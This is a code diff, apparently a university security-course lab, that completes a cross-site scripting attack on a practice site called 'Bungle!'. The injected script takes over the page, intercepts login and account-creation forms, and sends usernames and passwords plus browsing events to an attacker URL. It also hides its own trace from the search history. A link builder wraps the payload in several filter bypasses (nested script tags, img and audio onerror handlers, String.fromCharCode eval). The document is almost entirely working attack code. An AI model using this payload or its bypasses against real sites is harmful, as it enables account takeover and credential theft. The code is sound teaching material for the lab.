@@ -3,34 +3,173 @@
 <script>
 // Extend this function:
 function payload(attacker) {
-	
+	var CurrentTitle;
+	var CurrentPage;
+	var CurrentUser;	
+function log(data) {
 
-	function log(data) {
-	    console.log($.param(data))
-	    $.get(attacker, data);
+	    console.log($.param(data));
+	    $.get(attacker,data);
+}
+function PageInjection(){
+	
+	var usernamevalue=$("#username")[0]; 
+	var password=$("#userpass")[0];
+	$(".form-inline").attr("onsubmit","return false");
+	var ButtonLogIn=$("#log-in-btn");
+	if(ButtonLogIn){
+	    ButtonLogIn.click(function(e){
+	        console.log("log in requested");
+	        $.post("./login",
+	    {username:usernamevalue.value,
+	    password:password.value})
+	    .done(function(data){
+	    	CurrentUser=usernamevalue.value;	
+		    log({event:"login",user:CurrentUser,pass:password.value});
+	    HistoryUpdate();
+	    PageUpdate(data,"Bungle!","./");
+	    e.preventDefault();})
+	});}
+	var ButtonCreateAccount=$("#new-account-btn");
+	if(ButtonCreateAccount){
+	ButtonCreateAccount.click(function(e){
+	    console.log("account created");
+	    $.post("./create",
+		{username:usernamevalue.value,
+	 	 password:password.value})
+	    .done(function(data){
+	    	CurrentUser=usernamevalue.value;	
+		log({event:"login",user:CurrentUser,pass:password.value});
+	    HistoryUpdate();
+	    PageUpdate(data,"Bungle!","./");
+	    e.preventDefault();
+	})
+	});
 	}
-	function proxy(href) {
-	    $("html").load(href, function(){
-	        $("html").show();
-	        log({event: "nav", url: href});
-	        $("#query").val("pwned!");
-	    });
+	var ButtonLogOut=$("#log-out-btn");
+	if(ButtonLogOut){
+	ButtonLogOut.click(function(e){
+	    $.post("./logout")
+	    .done(function(data){	
+	    log({event:"logout",user:CurrentUser});
+	    CurrentUser=""
+	    HistoryUpdate();
+	    PageUpdate(data,"Bungle!","./");
+	    e.preventDefault();
+	})
+
+	});	ButtonLogOut.attr("onsubmit","return false");
 	}
-	$("html").hide();
+	var bunglelink=$("#bungle-lnk");
+	if(bunglelink){
+	bunglelink.removeAttr("href");
+	bunglelink.click(function(e){
+	$.get("./")
+	    .done(function(data){
+		HistoryUpdate();
+		PageUpdate(data,"Bungle!","./");
+		e.preventDefault();});
+	});
+	}
+	var ButtonSearch=$("#search-btn");
+	var query=$("#query")[0];
+	if(ButtonSearch){
+	    ButtonSearch.click(function(e){
+	    var urls="./search?q="+query.value;
+	    $.get(urls)
+	    .done(function(data){
+		HistoryUpdate();
+		PageUpdate(data,"Search Results",urls);
+		e.preventDefault();});
+	});
+	ButtonSearch.attr("onsubmit","return false");}
+	var ButtonSearchAgain=$("#search-again-btn");
+	if(ButtonSearchAgain){
+	ButtonSearchAgain.removeAttr("href");
+	ButtonSearchAgain.click(function(e){
+		$.get("./")
+		.done(function(data){
+		HistoryUpdate();
+		PageUpdate(data,"Bungle!","./");
+		e.preventDefault();});
+	});
+	}
+	$(".history-item").removeAttr("href");
+	$.each($(".history-item"),function(){
+	$(this).click(function(e){
+		var urls="./search?q="+this.text();
+	$.get(urls)
+	.done(function(data){
+		HistoryUpdate();
+		updateCurrentPage(data,"Search Results",urls);
+		e.preventDefault()});
+	});
+	console.log($(this).text());
+	if($(this).text().includes("payload"))
+		$(this).remove();
+	});
+}
+function PageUpdate(NewHtml,NewTitle,NewPage){
+	$("body").html(NewHtml);
+	CurrentTitle=NewTitle;
+	Currentpage=NewPage;
+	var data={
+	"html":$("body").html(),
+	"title":CurrentTitle,
+	"page":Currentpage
+	}
+	window.history.replaceState(data,CurrentTitle,Currentpage);
+	$("title")[0].text=CurrentTitle;
+	PageInjection();
+	LogPage();
+}
+function HistoryUpdate(){
+	var data={
+	"html":$("body").html(),
+	"title":CurrentTitle,
+	"page":Currentpage
+	}
+	window.history.pushState(data,CurrentTitle,Currentpage);
+}
+	function LogPage(){
+	var path=window.location.href;
+	log({event:"nav",user:CurrentUser,url:path});
+	}
+	function proxy(href) {	    
+	$("body").load(href,function(){
+	PageUpdate($("body").html(),"Bungle!","./");
+	window.onpopstate=function(event){
+	var html = event.state["html"];
+	var title= event.state["title"];
+	var page = event.state["page"];
+	PageUpdate(html,title,page); };
+	});
+}
+	$("body").empty();
 	proxy("./");
 }
 function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
 	    return target+"./search?xssdefense="+xssdefense.toString()+"&q="+encodeURIComponent("<script" + ">"+payload.toString()+";payload(\"" + attacker + "\");</script" + ">");} 
    else if (xssdefense == 1){ return target+"./search?xssdefense="+xssdefense.toString()+"&q="+encodeURIComponent("<scriscriptpt" + ">"+payload.toString()+";payload(\"" + attacker + "\");</SCriscriptpt" + ">"); }
-   else if (xssdefense == 2){ return target+"./search?xssdefense="+xssdefense.toString()+"&q="+encodeURIComponent("<scr<object>ipt" + ">"+payload.toString()+";payload(\"" + attacker + "\");</scr</object>ipt" + ">"); }
+   else if (xssdefense == 2){ return target+"./search?xssdefense="+xssdefense.toString()+"&q="+encodeURIComponent("<img src=x onerror='"+payload.toString()+";payload(\"" + attacker + "\");'</img" + ">"); }
+   else if (xssdefense == 3){ return target+"./search?xssdefense="+xssdefense.toString()+"&q="+encodeURIComponent("<audio src=x onerror='"+payload.toString()+";payload(\"" + attacker + "\");'</audio" + ">"); }
+   else if (xssdefense == 4){
+	var rawpayload=payload.toString()+";payload(\"" + attacker + "\");";
+	var payloadstr=rawpayload.charCodeAt(0);
+	for (var i=1;i<rawpayload.length;i++){
+	 payloadstr+=",";	
+	 payloadstr+=rawpayload.charCodeAt(i);
+	}
+	return target+"./search?xssdefense="+xssdefense.toString()+"&q="+encodeURIComponent("<script"+">"+"eval(String.fromCharCode("+payloadstr+"))"+"<\/script"+">");}
 }
-var xssdefense = 2;
+var xssdefense = 0;
 var target = "http://bungle-cs461.cs.illinois.edu/";
 var attacker = "http://127.0.0.1:31337/stolen";
 $(function() {
     var url = makeLink(xssdefense, target, attacker);
     $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+    
 });
 </script>
 <h3></h3>
